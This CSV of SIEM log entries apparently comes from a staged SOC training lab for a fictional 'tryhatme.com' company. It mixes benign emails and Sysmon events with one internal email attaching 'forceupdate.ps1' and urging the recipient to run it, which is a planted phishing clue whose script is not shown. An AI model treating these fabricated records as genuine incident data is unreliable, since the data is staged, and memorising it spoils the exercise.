"_id","_ignored","_index","_score",attachment,content,datasource,direction,"dns.answers.data","dns.question.name","dns.resolved_ip","event.action","event.code","file.path","host.name",message,"network.protocol","powershell.command.invocation_details.value","powershell.command.name","powershell.file.script_block_text","process.command_line","process.name","process.parent.name","process.parent.pid","process.pid","process.working_directory",recipient,"registry.key","registry.path","registry.value",sender,subject,timestamp,"winlog.process.pid"
"YXV-ypsB8mE-0EyZh3_q","-",logs,"-","forceupdate.ps1","Michelle, here's the updated script. This version should work better - just run it when you get a chance.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michelle.smith@tryhatme.com","-","-","-","yani.zubair@tryhatme.com","Force update fix","Jan 17, 2026 @ 02:47:10.304","-"
"YHV-ypsB8mE-0EyZgH8B","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3456","-","-","-","-","-","C:\Windows\system32\rundll32.exe C:\Windows\system32\inetcpl.cpl,ClearMyTracksByProcess Flags:276824072 WinX:0 WinY:0 IEFrame:0000000000000000","rundll32.exe","iexplore.exe",3937,3829,"C:\Users\safa.prince\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:46:38.304","-"
"XnV9ypsB8mE-0EyZ1H8m","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3450","-","-","-","-","-","-","spoolsv.exe","-","-",3824,"-","-","System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0003\DriverVersion","HKLM\System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0003\DriverVersion",DriverVersion,"-","-","Jan 17, 2026 @ 02:46:36.304","-"
"X3V-ypsB8mE-0EyZUX9U","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3452","-","-","-","-","-","-","-","-","-",3764,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{1E7F5481-8BCC-4426-B671-08BCD04848A0}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{1E7F5481-8BCC-4426-B671-08BCD04848A0}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:46:36.304","-"
"XXV9ypsB8mE-0EyZ0H9X","-",logs,"-",None," Will there be a recording available for those unable to attend live",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","cain.omoore@tryhatme.com","-","-","-","osman@stylewatchjournal.com","RE: RE: Seminar Registration: Hat Industry Innovation Trends","Jan 17, 2026 @ 02:46:22.304","-"
"W3V9ypsB8mE-0EyZen9x","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3449","-","-","-","-","-","""C:\Program Files\Internet Explorer\iexplore.exe"" -startmanager -Embedding","iexplore.exe","-",3987,3903,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:46:19.304","-"
"XHV9ypsB8mE-0EyZgn8d","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3452","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3968,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:45:56.304","-"
"WnV9ypsB8mE-0EyZXn_2","-",logs,"-",None,"This is getting ridiculous—why is this still unresolved?",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","sophie.j@tryhatme.com","-","-","-","sophie.j@tryhatme.com","RE: RE: Concerns over IHateHats.tech","Jan 17, 2026 @ 02:45:48.304","-"
"V3V8ypsB8mE-0EyZ_X9O","-",logs,"-",None," Travel through time and experience the evolution of hats from ancient Egypt to futuristic Mars Only 500 per ticket",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","contact@tryhatme.com","-","-","-","josephine@gmail.com","Time Traveling Hat Adventure Explore Ancient Lands for Cheap","Jan 17, 2026 @ 02:45:41.304","-"
"VHV8ypsB8mE-0EyZyn-T","-",logs,"-",None," Thank you for the opportunity I confirm my availability and look forward to speaking with your team",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","duke@trendsettingtrilbies.com","-","-","-","invoice@tryhatme.com","RE: Job Interview Invitation: Exciting Career Opportunity","Jan 17, 2026 @ 02:45:28.304","-"
"VnV8ypsB8mE-0EyZ7X_c","-",logs,"-",None," Please review and confirm availability for the proposed meeting time",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","contact@tryhatme.com","-","-","-","day@stylishhatboutique.com","FWD: Scheduling a Virtual Meeting to Discuss Market Trends","Jan 17, 2026 @ 02:45:28.304","-"
"WHV9ypsB8mE-0EyZLH9c","-",logs,"-",None," The upcoming seminar will cover the latest innovations in hat manufacturing and design Secure your spot today",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","barker@hatcouturecompany.net","-","-","-","sophie.j@tryhatme.com","Seminar Registration: Hat Industry Innovation Trends","Jan 17, 2026 @ 02:45:18.304","-"
